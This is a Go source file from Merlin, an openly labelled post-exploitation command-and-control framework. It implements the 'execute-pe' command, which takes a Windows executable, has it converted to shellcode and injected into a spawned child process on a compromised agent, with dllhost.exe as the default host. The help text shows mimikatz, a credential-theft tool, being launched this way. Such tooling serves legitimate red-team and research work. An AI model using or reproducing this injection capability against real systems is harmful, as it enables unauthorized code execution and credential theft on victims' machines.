/*
Merlin is a post-exploitation command and control framework.

This file is part of Merlin.
Copyright (C) 2023  Russel Van Tuyl

Merlin is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
any later version.

Merlin is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with Merlin.  If not, see <http://www.gnu.org/licenses/>.
*/

package execute_pe

import (
	// Standard
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"io"
	"log/slog"
	os2 "os"
	"strings"

	// 3rd Party
	"github.com/chzyer/readline"
	"github.com/mattn/go-shellwords"
	uuid "github.com/satori/go.uuid"

	// Internal
	"github.com/Ne0nd0g/merlin/pkg/cli/commands"
	"github.com/Ne0nd0g/merlin/pkg/cli/entity/help"
	"github.com/Ne0nd0g/merlin/pkg/cli/entity/menu"
	"github.com/Ne0nd0g/merlin/pkg/cli/entity/os"
	"github.com/Ne0nd0g/merlin/pkg/cli/message"
	"github.com/Ne0nd0g/merlin/pkg/cli/services/rpc"
)

// Command is an aggregate structure for a command executed on the command line interface
type Command struct {
	name   string      // name is the name of the command
	help   help.Help   // help is the Help structure for the command
	menus  []menu.Menu // menu is the Menu the command can be used in
	native bool        // native is true if the command is executed by an Agent using only Golang native code
	os     os.OS       // os is the supported operating system the Agent command can be executed on
}

// NewCommand is a factory that builds and returns a Command structure that implements the Command interface
func NewCommand() *Command {
	var cmd Command
	cmd.name = "execute-pe"
	cmd.menus = []menu.Menu{menu.AGENT}
	cmd.os = os.WINDOWS
	description := "Execute Windows PE as shellcode in a child process"
	// Style guide for usage https://developers.google.com/style/code-syntax
	usage := "execute-pe peFilePath [peArgumentes] [spawnToPath] [spawnToArguments]"
	example := "Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» execute-pe mimikatz.exe \"coffee exit\" " +
		"C:\\\\Windows\\\\System32\\\\WerFault.exe Testing\nMerlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]»\n" +
		"\t[-] Created job BSvJZFvbRZ for agent c1090dbc-f2f7-4d90-a241-86e0c0217786\n\n\n" +
		"\t[+] Results for c1090dbc-f2f7-4d90-a241-86e0c0217786 job BSvJZFvbRZ\n\n\n" +
		"\t  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29\n" +
		"\t .## ^ ##.  \"A La Vie, A L'Amour\" - (oe.eo)\n" +
		"\t ## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n" +
		"\t ## \\ / ##       > https://blog.gentilkiwi.com/mimikatz\n" +
		"\t '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )\n" +
		"\t  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/\n\n" +
		"\tmimikatz(commandline) # coffee\n\n" +
		"\t    ( (\n" +
		"\t     ) )\n" +
		"\t  .______.\n" +
		"\t  |      |]\n" +
		"\t  \\      /\n" +
		"\t   `----'\n\n" +
		"\tmimikatz(commandline) # exit\n" +
		"\tBye!"
	notes := "Uses go-donut to convert a Windows Portable Executable (PE), commonly an .exe, into \" +\n\t\t\"shellcode and then uses the windows/x64/go/exec/createProcess Merlin module to execute the shellcode." +
		"The command requires the file path to the assembly you wish to execute in the <pe path> " +
		"argument.All other arguments are optional. The <spawnto path> argument is the process that will be started on " +
		"the target and where the shellcode will be injected and executed. If a <spawnto path> is not provided, " +
		"C:\\WIndows\\System32\\dllhost.exe will be used. The <spawnto args> value is used as an argument when starting " +
		"the spawnto process.\n\n" +
		"\tCurrently this command only supports .NET v4.0 assemblies. For more granular control, use the 'windows/x64/go/exec/donut' module.\n\n" +
		"\tBecause \\ is used to escape a character, file paths require two (e.g., C:\\\\Windows)\n\n" +
		"\tUse quotes to enclose multiple arguments for <assembly args> (e.g., execute-pe mimikatz.exe \"coffee exit\")"
	cmd.help = help.NewHelp(description, example, notes, usage)
	return &cmd
}

// Completer returns the data that is displayed in the CLI for tab completion depending on the menu the command is for
// Errors are not returned to ensure the CLI is not interrupted.
// Errors are logged and can be viewed by enabling debug output in the CLI
func (c *Command) Completer(m menu.Menu, id uuid.UUID) readline.PrefixCompleterInterface {

	return readline.PcItem(c.name)
}

// Do executes the command and returns a Response to the caller to facilitate changes in the CLI service
// m, an optional parameter, is the Menu the command was executed from
// id, an optional parameter, used to identify a specific Agent or Listener
// arguments, and optional, parameter, is the full unparsed string entered on the command line to include the
// command itself passed into command for processing
func (c *Command) Do(m menu.Menu, id uuid.UUID, arguments string) (response commands.Response) {
	// Parse the arguments
	args, err := shellwords.Parse(arguments)
	if err != nil {
		response.Message = message.NewErrorMessage(fmt.Errorf("there was an error parsing the arguments: %s", err))
		return
	}

	// Validate at least one argument, in addition to the command, was provided
	if len(args) < 2 {
		response.Message = message.NewUserMessage(message.Info, fmt.Sprintf("'%s' command requires at least one argument\n%s", c, c.help.Usage()))
		return
	}

	// Check for help first
	if len(args) > 1 {
		switch strings.ToLower(args[1]) {
		case "help", "-h", "--help", "?", "/?":
			response.Message = message.NewUserMessage(message.Info, fmt.Sprintf("'%s' command help\n\nDescription:\n\t%s\nUsage:\n\t%s\nExample:\n\t%s\nNotes:\n\t%s", c, c.help.Description(), c.help.Usage(), c.help.Example(), c.help.Notes()))
			return
		}
	}

	// 0. execute-pe
	// 1. PEPath
	// 2. PEArguments
	// 3. spawnToPath
	// 4. spawnToArguments

	// Validate that file path exists
	_, err = os2.Stat(args[1])
	if os2.IsNotExist(err) {
		response.Message = message.NewErrorMessage(fmt.Errorf("the file path does not exist: %s", args[1]))
		return
	}
	// Read in the file
	data, err := os2.ReadFile(args[1])
	if err != nil {
		response.Message = message.NewErrorMessage(fmt.Errorf("there was an error reading the file at %s: %s", args[1], err))
		return
	}

	// Set the PE arguments, if any
	var params string
	if len(args) > 2 {
		params = args[2]
	}

	// Set the SpawnTo path
	spawnTo := "C:\\WIndows\\System32\\dllhost.exe"
	if len(args) > 3 {
		spawnTo = args[3]
	}

	// Set the SpawnTo arguments, if any
	var spawnToArgs string
	if len(args) > 4 {
		spawnToArgs = args[4]
	}

	// Generate and log filepath and hash
	fileHash := sha256.New() // #nosec G401 // Use SHA1 because it is what many Blue Team tools use
	_, err = io.WriteString(fileHash, string(data))
	if err != nil {
		slog.Error(fmt.Sprintf("there was an error generating tha SHA256 file hash for %s: %s", args[1], err))
	} else {
		slog.Info("Uploading file from the 'load-assembly' command", "filepath", args[1], "SHA256", hex.EncodeToString(fileHash.Sum(nil)))
	}

	// 0. PE file bytes as Base64 string
	// 1. PE arguments
	// 2. SpawnTo path
	// 3. SpawnTo arguments
	newArgs := []string{base64.StdEncoding.EncodeToString(data), params, spawnTo, spawnToArgs}
	response.Message = rpc.ExecutePE(id, newArgs)
	return
}

// Help returns a help.Help structure that can be used to view a command's Description, Notes, Usage, and an example
func (c *Command) Help(m menu.Menu) help.Help {
	return c.help
}

// Menu checks to see if the command is supported for the provided menu
func (c *Command) Menu(m menu.Menu) bool {
	for _, v := range c.menus {
		if v == m || v == menu.ALLMENUS {
			return true
		}
	}
	return false
}

// OS returns the supported operating system the Agent command can be executed on
func (c *Command) OS() os.OS {
	return c.os
}

// String returns the unique name of the command as a string
func (c *Command) String() string {
	return c.name
}
